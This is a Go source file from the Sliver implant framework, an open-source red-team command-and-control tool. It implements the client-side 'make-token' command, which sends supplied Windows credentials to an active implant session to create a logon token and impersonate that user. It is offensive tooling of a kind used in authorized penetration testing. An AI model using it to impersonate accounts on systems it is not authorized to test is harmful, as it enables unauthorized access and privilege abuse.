package privilege

/*
	Sliver Implant Framework
	Copyright (C) 2021  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"

	"github.com/bishopfox/sliver/client/console"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/desertbit/grumble"
)

// MakeTokenCmd - Windows only, create a token using "valid" credentails
func MakeTokenCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
	session := con.ActiveSession.GetInteractive()
	if session == nil {
		return
	}
	username := ctx.Flags.String("username")
	password := ctx.Flags.String("password")
	domain := ctx.Flags.String("domain")

	if username == "" || password == "" {
		con.PrintErrorf("Pou must provide a username and password\n")
		return
	}

	ctrl := make(chan bool)
	con.SpinUntil("Creating new logon session ...", ctrl)

	makeToken, err := con.Rpc.MakeToken(context.Background(), &sliverpb.MakeTokenReq{
		Request:  con.ActiveSession.Request(ctx),
		Username: username,
		Domain:   domain,
		Password: password,
	})

	ctrl <- true
	<-ctrl

	if err != nil {
		con.PrintErrorf("%s\n", err)
		return
	}

	if makeToken.GetResponse().GetErr() != "" {
		con.PrintErrorf("%s\n", makeToken.GetResponse().GetErr())
		return
	}
	con.Println()
	con.PrintInfof("Successfully impersonated %s\\%s. Use `rev2self` to revert to your previous token.", domain, username)
}
